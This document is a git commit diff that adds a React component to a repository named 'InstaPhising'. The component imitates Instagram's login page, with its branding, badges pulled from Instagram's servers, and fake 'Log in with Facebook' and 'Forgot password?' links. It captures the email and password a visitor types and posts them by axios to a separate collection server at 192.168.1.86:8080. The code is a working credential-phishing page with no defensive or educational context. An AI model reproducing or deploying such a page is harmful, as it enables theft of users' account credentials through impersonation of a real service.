fc7935a1670ea64da372f7e18db65d99fa808cdc
Atahan Poyraz <atahanpoyraz@gmail.com>
2023-09-28 16:28:19 +0300

    Add files via upload

---
+++ InstaPhising/Server/app/src/App.js
@@ -0,0 +1,111 @@
+import React, { useState } from "react";
+import "./App.css";
+import axios from "axios"
+
+const App = () => {
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    const formData = {
+      email:email,
+      password:password,
+    }
+    axios.post("http://192.168.1.86:8080/", formData)
+    .then((response) => {
+        console.log("Succsess");
+    })
+    .catch((error) => {
+        console.error("Error");
+    });
+  };
+
+  return (
+    <React.Fragment>
+      <div id="wrapper">
+        <div className="container">
+          <div className="phone-app-demo" />
+          <div className="form-data">
+            <form action="">
+              <div className="logo">
+                <h1>Instagram</h1>
+              </div>
+              <input
+                type="text"
+                placeholder="Phone number, username, or email"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+              />
+              <input
+                type="password"
+                placeholder="Password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+              />
+              <button className="form-btn" type="submit" onClick={handleSubmit}>
+                Log in
+              </button>
+              <span className="has-separator">Or</span>
+              <a href="#" className="facebook-login">
+                <i className="fab fa-facebook" /> Log in with Facebook
+              </a>
+              <a className="password-reset" href="#">
+                Forgot password?
+              </a>
+            </form>
+            <div className="sign-up">
+              Don't have an account? <a href="#">Sign up</a>
+            </div>
+            <div className="get-the-app">
+              <span>Get the app</span>
+              <div className="badge">
+                <img
+                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
+                  alt="android App"
+                />
+                <img
+                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
+                  alt="ios app"
+                />
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <footer>
+          <div className="container">
+            <nav className="footer-nav">
+              <ul>
+                <li>
+                  <a href="#">About Us</a>
+                </li>
+                <li>
+                  <a href="#">Support</a>
+                </li>
+                <li>
+                  <a href="#">Jobs</a>
+                </li>
+                <li>
+                  <a href="#">Privacy</a>
+                </li>
+                <li>
+                  <a href="#">Terms</a>
+                </li>
+                <li>
+                  <a href="#">Profiles</a>
+                </li>
+                <li>
+                  <a href="#">Languages</a>
+                </li>
+              </ul>
+            </nav>
+            <div className="copyright-notice">&copy; 2023 Complaints</div>
+          </div>
+        </footer>
+      </div>
+    </React.Fragment>
+  );
+};
+
+export default App;
